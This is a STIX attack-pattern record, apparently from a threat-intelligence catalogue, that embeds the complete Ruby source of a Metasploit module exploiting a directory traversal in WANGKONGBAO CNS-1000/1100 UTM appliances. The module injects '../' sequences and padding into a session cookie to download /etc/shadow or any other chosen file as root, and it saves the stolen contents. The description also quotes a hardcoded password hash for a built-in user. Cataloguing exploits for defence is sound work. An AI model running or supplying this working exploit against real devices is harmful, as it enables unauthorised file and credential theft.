{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15ab0527-226e-4f42-a833-d08767628d85",
    "created": "2024-08-14T16:30:41.745816Z",
    "modified": "2024-08-14T16:30:41.74582Z",
    "name": "WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal",
    "description": " This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka Network Security Platform. This directory traversal vulnerability is interesting because the apache server is running as root, this means we can grab anything we want! For instance, the /etc/shadow and /etc/passwd files for the special kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wangkongbao_traversal.rb",
            "external_id": "wangkongbao_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal',\n      'Description'    => %q{\n          This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka\n        Network Security Platform. This directory traversal vulnerability is interesting\n        because the apache server is running as root, this means we can grab anything we\n        want! For instance, the /etc/shadow and /etc/passwd files for the special\n        kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user\n      },\n      'References'     =>\n        [\n          ['CVE', '2012-4031'],\n          ['EDB', '19526']\n        ],\n      'Author'         =>\n        [\n          'Dillon Beresford'\n        ],\n      'License'        =>  MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(85),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 10])\n      ])\n  end\n\n  def run_host(ip)\n    # No point to continue if no filename is specified\n    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?\n      print_error(\"Please supply the name of the file you want to download\")\n      return\n    end\n\n    travs = \"../\" * datastore['DEPTH']\n    travs = travs[0,travs.rindex('/')]\n\n    # Create request\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"/src/acloglogin.php\",\n      'headers' =>\n        {\n          'Connection' => \"keep-alive\",\n          'Accept-Encoding' => \"zip,deflate\",\n          'Cookie' => \"PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned\" + travs + datastore['FILEPATH'] + \"/.\"*4043\n        },\n    }, 25)\n\n    print_good \"File retreived successfully\"\n\n    # Show data if needed\n    if res and res.code == 200\n      vprint_line(res.to_s)\n      fname = File.basename(datastore['FILEPATH'])\n\n      path = store_loot(\n        'cns1000utm.http',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname\n      )\n      print_status(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}